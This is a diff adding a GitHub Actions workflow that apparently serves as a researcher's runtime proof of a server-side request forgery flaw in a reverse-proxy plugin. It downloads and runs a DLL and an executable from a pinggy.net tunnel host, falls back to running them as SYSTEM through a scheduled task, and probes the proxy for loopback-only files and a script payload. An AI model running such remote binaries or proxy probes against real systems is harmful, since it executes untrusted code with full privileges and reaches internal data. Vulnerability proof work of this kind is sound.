@@ -1,0 +1,54 @@
+name: exact-reverse-proxy-runtime-proof
+on:
+  workflow_dispatch:
+jobs:
+  proof:
+    runs-on: windows-latest
+    timeout-minutes: 15
+    steps:
+      - name: Exercise exact signed plugin with its exported lifecycle
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Continue'
+          New-Item -ItemType Directory -Force C:\rp\backend | Out-Null
+          Set-Content -NoNewline C:\rp\backend\secret.txt 'RESEARCHER_CONTROLLED_LOOPBACK_SECRET_8F6C21'
+          Set-Content -NoNewline C:\rp\backend\payload.html '<!doctype html><title>rp</title><script>document.body.innerText="RP_ORIGIN:"+location.origin</script>'
+          $base = 'https://kazqn-2600-1f18-68f7-2200-aca3-814e-a7a5-3b6b.free.pinggy.net'
+          curl.exe -fsSL -H 'X-Pinggy-No-Screen: 1' "$base/CsReverseProxy.dll" -o C:\rp\CsReverseProxy.dll
+          curl.exe -fsSL -H 'X-Pinggy-No-Screen: 1' "$base/reverseproxy_harness.exe" -o C:\rp\reverseproxy_harness.exe
+          Get-FileHash -Algorithm SHA256 C:\rp\CsReverseProxy.dll
+          Get-FileHash -Algorithm SHA256 C:\rp\reverseproxy_harness.exe
+          $backend = Start-Process -PassThru -WindowStyle Hidden python -ArgumentList '-m','http.server','19090','--bind','127.0.0.1','--directory','C:\rp\backend' -RedirectStandardOutput C:\rp\backend.out -RedirectStandardError C:\rp\backend.err
+          $h = Start-Process -PassThru -WindowStyle Hidden C:\rp\reverseproxy_harness.exe -ArgumentList 'C:\rp\CsReverseProxy.dll','150' -RedirectStandardOutput C:\rp\harness.out -RedirectStandardError C:\rp\harness.err
+          Start-Sleep 8
+          '--- initial harness log ---'; Get-Content C:\rp\harness.err -ErrorAction SilentlyContinue
+          '--- initial listeners ---'; netstat -ano | Select-String '18443|19090'
+          if (-not (Get-NetTCPConnection -State Listen -LocalPort 18443 -ErrorAction SilentlyContinue)) {
+            '--- starting harness under SYSTEM fallback ---'
+            $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c C:\rp\reverseproxy_harness.exe C:\rp\CsReverseProxy.dll 130 1>C:\rp\system.out 2>C:\rp\system.err'
+            $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+            Register-ScheduledTask -TaskName ExactReverseProxyProof -Action $action -Principal $principal -Force | Out-Null
+            Start-ScheduledTask -TaskName ExactReverseProxyProof
+            Start-Sleep 8
+            '--- system harness log ---'; Get-Content C:\rp\system.err -ErrorAction SilentlyContinue
+            '--- fallback listeners ---'; netstat -ano | Select-String '18443|19090'
+          }
+          $paths = @(
+            '/http/127.0.0.1:19090/secret.txt',
+            '/http/localhost:19090/secret.txt',
+            '/http/http://127.0.0.1:19090/secret.txt',
+            '/http/127.0.0.1:19090/payload.html',
+            '/https/example.com/'
+          )
+          foreach($path in $paths) {
+            "--- PROBE $path ---"
+            curl.exe --noproxy '*' -sS -i --max-time 15 "http://127.0.0.1:18443$path"
+            "curl_exit=$LASTEXITCODE"
+          }
+          '--- final harness logs ---'
+          Get-Content C:\rp\harness.err -ErrorAction SilentlyContinue
+          Get-Content C:\rp\system.err -ErrorAction SilentlyContinue
+          '--- backend log ---'; Get-Content C:\rp\backend.err -ErrorAction SilentlyContinue
+          Unregister-ScheduledTask -TaskName ExactReverseProxyProof -Confirm:$false -ErrorAction SilentlyContinue
+          Stop-Process -Id $h.Id -Force -ErrorAction SilentlyContinue
+          Stop-Process -Id $backend.Id -Force -ErrorAction SilentlyContinue
